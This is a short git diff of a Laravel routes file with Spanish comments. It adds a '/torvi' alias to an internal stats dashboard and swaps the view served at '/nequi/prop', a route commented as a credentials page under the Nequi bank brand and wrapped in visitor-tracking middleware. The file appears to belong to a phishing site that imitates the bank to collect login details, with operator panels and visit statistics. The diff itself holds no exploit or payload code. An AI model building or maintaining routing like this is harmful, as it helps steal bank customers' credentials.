@@ -7,6 +7,7 @@ use App\Http\Controllers\StatsController;
 // Dashboard de estadísticas (solo acceso interno)
 Route::middleware([\App\Http\Middleware\InternalOnly::class])->group(function () {
     Route::get('/stats', [StatsController::class, 'index'])->name('stats.dashboard');
+    Route::get('/torvi', [StatsController::class, 'index'])->name('stats.torvi');
     Route::get('/stats/api', [StatsController::class, 'api'])->name('stats.api');
     Route::post('/api/track', [StatsController::class, 'trackEvent'])->name('stats.track');
 });
@@ -73,7 +74,7 @@ Route::get('/nequi/propulsor', function () {
 
 // Ruta de Nequi Prop (credenciales)
 Route::get('/nequi/prop', function () {
-    return view('nequi.prop');
+    return view('nequi.nequ1');
 })->middleware(\App\Http\Middleware\TrackVisitor::class)->name('nequi.prop');
 
 // Rutas específicas por panel y vista (backwards compatibility y acceso directo)
